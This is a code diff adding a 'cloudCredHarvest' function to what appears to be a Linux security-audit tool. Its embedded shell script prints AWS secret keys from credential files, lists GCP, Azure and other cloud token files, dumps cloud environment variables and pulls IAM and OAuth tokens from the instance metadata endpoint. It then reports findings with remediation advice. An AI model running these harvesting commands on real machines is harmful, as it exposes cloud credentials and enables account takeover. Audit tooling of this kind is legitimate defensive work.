@@ -729,3 +729,126 @@ find /root /home -maxdepth 3 -name "*.asc" -o -name "*.gpg" -o -name "*.pgp" 2>/
 
   return { output: output.join("\n"), findings }
 }
+
+export async function cloudCredHarvest(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== Cloud Credential Harvest ==="]
+
+  const script = `
+echo "--- AWS Credentials ---"
+for dir in /root /home/*; do
+  if [ -f "$dir/.aws/credentials" ]; then
+    echo "[+] AWS credentials: $dir/.aws/credentials"
+    grep -E "^\\[|aws_access_key_id|aws_secret_access_key|aws_session_token" "$dir/.aws/credentials" 2>/dev/null
+    echo ""
+  fi
+  if [ -f "$dir/.aws/config" ]; then
+    echo "[*] AWS config: $dir/.aws/config"
+    grep -E "^\\[|role_arn|source_profile|region" "$dir/.aws/config" 2>/dev/null
+    echo ""
+  fi
+done
+env | grep -i "^AWS_" 2>/dev/null
+
+echo ""
+echo "--- GCP Credentials ---"
+for dir in /root /home/*; do
+  gcpdir="$dir/.config/gcloud"
+  if [ -d "$gcpdir" ]; then
+    echo "[+] GCP config: $gcpdir"
+    [ -f "$gcpdir/credentials.db" ] && echo "  [+] credentials.db found ($(wc -c < "$gcpdir/credentials.db") bytes)"
+    [ -f "$gcpdir/application_default_credentials.json" ] && echo "  [+] application_default_credentials.json found"
+    [ -f "$gcpdir/properties" ] && grep -E "account|project" "$gcpdir/properties" 2>/dev/null
+    echo ""
+  fi
+done
+[ -n "$GOOGLE_APPLICATION_CREDENTIALS" ] && echo "[+] GOOGLE_APPLICATION_CREDENTIALS=$GOOGLE_APPLICATION_CREDENTIALS"
+
+echo ""
+echo "--- Azure Credentials ---"
+for dir in /root /home/*; do
+  azdir="$dir/.azure"
+  if [ -d "$azdir" ]; then
+    echo "[+] Azure config: $azdir"
+    [ -f "$azdir/accessTokens.json" ] && echo "  [+] accessTokens.json found ($(wc -c < "$azdir/accessTokens.json") bytes)"
+    [ -f "$azdir/azureProfile.json" ] && echo "  [*] azureProfile.json found"
+    [ -f "$azdir/msal_token_cache.json" ] && echo "  [+] msal_token_cache.json found"
+    echo ""
+  fi
+done
+env | grep -i "^AZURE_" 2>/dev/null
+
+echo ""
+echo "--- Other Cloud Tokens ---"
+for dir in /root /home/*; do
+  [ -f "$dir/.config/doctl/config.yaml" ] && echo "[+] DigitalOcean: $dir/.config/doctl/config.yaml"
+  [ -f "$dir/.config/heroku/config" ] && echo "[+] Heroku CLI: $dir/.config/heroku/config"
+  [ -f "$dir/.config/hcloud/cli.toml" ] && echo "[+] Hetzner: $dir/.config/hcloud/cli.toml"
+  [ -f "$dir/.terraform.d/credentials.tfrc.json" ] && echo "[+] Terraform Cloud: $dir/.terraform.d/credentials.tfrc.json"
+  [ -f "$dir/.config/linode-cli" ] && echo "[+] Linode: $dir/.config/linode-cli"
+done
+
+echo ""
+echo "--- Instance Metadata ---"
+curl -s -m 2 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token 2>/dev/null && echo "" && echo "[+] GCP metadata token accessible"
+curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null | head -5 && echo "[+] AWS metadata accessible"
+curl -s -m 2 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null | head -3 && echo "[+] Azure IMDS accessible"
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("aws_access_key_id") || r.stdout.includes("aws_secret_access_key")) {
+    findings.push({
+      checkId: "LNX-CLOUD-001",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "FOUND",
+      resource: "aws_credentials",
+      title: "AWS credentials found on disk",
+      details: "AWS access keys found in ~/.aws/credentials — can be used for cloud resource access and privilege escalation",
+      remediation: "Use IAM roles instead of long-term access keys. Rotate keys regularly. Use aws-vault for local key management.",
+    })
+  }
+
+  if (r.stdout.includes("credentials.db") || r.stdout.includes("application_default_credentials")) {
+    findings.push({
+      checkId: "LNX-CLOUD-002",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "FOUND",
+      resource: "gcp_credentials",
+      title: "GCP credentials found on disk",
+      details: "GCP credential files found — can be used for cloud resource access via gcloud CLI or API",
+      remediation: "Use workload identity or service account impersonation. Restrict credential file permissions.",
+    })
+  }
+
+  if (r.stdout.includes("accessTokens.json") || r.stdout.includes("msal_token_cache")) {
+    findings.push({
+      checkId: "LNX-CLOUD-003",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "FOUND",
+      resource: "azure_credentials",
+      title: "Azure credentials found on disk",
+      details: "Azure access tokens or MSAL cache found — can be used for Azure resource access",
+      remediation: "Use managed identities. Clear token caches after use (az account clear).",
+    })
+  }
+
+  if (r.stdout.includes("metadata token accessible") || r.stdout.includes("metadata accessible") || r.stdout.includes("IMDS accessible")) {
+    findings.push({
+      checkId: "LNX-CLOUD-004",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "FOUND",
+      resource: "instance_metadata",
+      title: "Cloud instance metadata service accessible",
+      details: "IMDS is accessible — can retrieve IAM credentials, instance identity, and user data without authentication",
+      remediation: "Use IMDSv2 (AWS) with hop limit. Restrict metadata access via firewall rules. Use network policies.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
